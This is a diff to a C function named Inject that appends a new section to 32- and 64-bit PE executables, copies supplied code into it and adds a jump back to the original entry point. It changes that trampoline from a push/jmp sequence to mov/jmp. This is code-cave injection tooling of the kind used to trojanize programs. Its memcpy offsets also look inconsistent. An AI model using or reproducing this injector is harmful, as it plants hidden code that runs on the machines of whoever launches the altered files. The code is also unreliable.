@@ -114,7 +114,7 @@ VOID Inject(LPVOID fileData, DWORD size, char* code, DWORD codeSize, char* outPa
 		if (baseOEP < imageBase) {
 			Error("Unexpected Error.", FALSE, TRUE, 1);
 		}
-		char movRAX[] = "\x48\xB8"; // mov rax, 
+		char mov[] = "\x48\xB8"; // mov rax, 
 		char hexOEP[8] = {
 			baseOEP >> 0 & 0xff ,
 			baseOEP >> 8 & 0xff ,
@@ -125,10 +125,9 @@ VOID Inject(LPVOID fileData, DWORD size, char* code, DWORD codeSize, char* outPa
 			baseOEP >> 48 & 0xff ,
 			baseOEP >> 56 & 0xff ,
 		};// convert entry point to hex
-		char pushRAX[] = "\x50"; // push rax
-		char jmp[] = "\xff\x24\x24"; //jmp [rsp]
+		char jmp[] = "\xff\xe0"; //jmp rax
 
-		int injectSize = sizeof(movRAX) + sizeof(hexOEP) + sizeof(pushRAX) + sizeof(jmp) + codeSize;
+		int injectSize = sizeof(mov) + sizeof(hexOEP) +  sizeof(jmp) + codeSize;
 
 		int newSection = pe.ntHeader64.FileHeader.NumberOfSections;
 		pe.ntHeader64.FileHeader.NumberOfSections++;
@@ -161,11 +160,10 @@ VOID Inject(LPVOID fileData, DWORD size, char* code, DWORD codeSize, char* outPa
 		pe.sections[newSection] = (char*)calloc(pe.sectionHeader[newSection].SizeOfRawData, 1);
 
 		//copy data to section
-		memcpy(pe.sections[newSection], code, codeSize - 1);
-		memcpy(pe.sections[newSection] + codeSize - 1, movRAX, sizeof(movRAX));
-		memcpy(pe.sections[newSection] + codeSize + sizeof(movRAX) - 2, hexOEP, sizeof(hexOEP));
-		memcpy(pe.sections[newSection] + codeSize + sizeof(movRAX) + sizeof(hexOEP) - 2, pushRAX, sizeof(pushRAX));
-		memcpy(pe.sections[newSection] + codeSize + sizeof(movRAX) + sizeof(hexOEP) + sizeof(pushRAX) - 3, jmp, sizeof(jmp));
+		memcpy(pe.sections[newSection], code, codeSize);
+		memcpy(pe.sections[newSection] + codeSize - 1, mov, sizeof(mov));
+		memcpy(pe.sections[newSection] + codeSize + sizeof(mov) - 2, hexOEP, sizeof(hexOEP));
+		memcpy(pe.sections[newSection] + codeSize + sizeof(mov) + sizeof(hexOEP) - 2, jmp, sizeof(jmp));
 
 		writeBinary(pe, outPath, size + pe.sectionHeader[newSection].SizeOfRawData);
 	}
@@ -179,16 +177,16 @@ VOID Inject(LPVOID fileData, DWORD size, char* code, DWORD codeSize, char* outPa
 			Error("Unexpected Error.", FALSE, TRUE, 1);
 		}
 
-		char push[] = "\x68"; // push to esp
+		char mov[] = "\xb8"; // mov eax
 		char hexOEP[4] = {
 			baseOEP >> 0 & 0xff ,
 			baseOEP >> 8 & 0xff ,
 			baseOEP >> 16 & 0xff ,
 			baseOEP >> 24 & 0xff ,
 		};// convert entry point to hex
-		char jmp[] = "\xff\x24\x24"; //jmp [esp]
+		char jmp[] = "\xff\xe0"; //jmp eax
 
-		int injectSize = sizeof(push) + sizeof(jmp) + sizeof(hexOEP) + codeSize;
+		int injectSize = sizeof(mov) + sizeof(jmp) + sizeof(hexOEP) + codeSize;
 
 		int newSection = pe.ntHeader32.FileHeader.NumberOfSections;
 		pe.ntHeader32.FileHeader.NumberOfSections++;
@@ -222,9 +220,9 @@ VOID Inject(LPVOID fileData, DWORD size, char* code, DWORD codeSize, char* outPa
 
 		//copy data to section
 		memcpy(pe.sections[newSection], code, codeSize);
-		memcpy(pe.sections[newSection] + codeSize - 1, push, sizeof(push));
-		memcpy(pe.sections[newSection] + codeSize + sizeof(push) - 2, hexOEP, sizeof(hexOEP));
-		memcpy(pe.sections[newSection] + codeSize + sizeof(push) + sizeof(hexOEP) - 2, jmp, sizeof(jmp));
+		memcpy(pe.sections[newSection] + codeSize - 1, mov, sizeof(mov));
+		memcpy(pe.sections[newSection] + codeSize + sizeof(mov) - 2, hexOEP, sizeof(hexOEP));
+		memcpy(pe.sections[newSection] + codeSize + sizeof(mov) + sizeof(hexOEP) - 2, jmp, sizeof(jmp));
 
 		writeBinary(pe, outPath, size + pe.sectionHeader[newSection].SizeOfRawData);
 	}
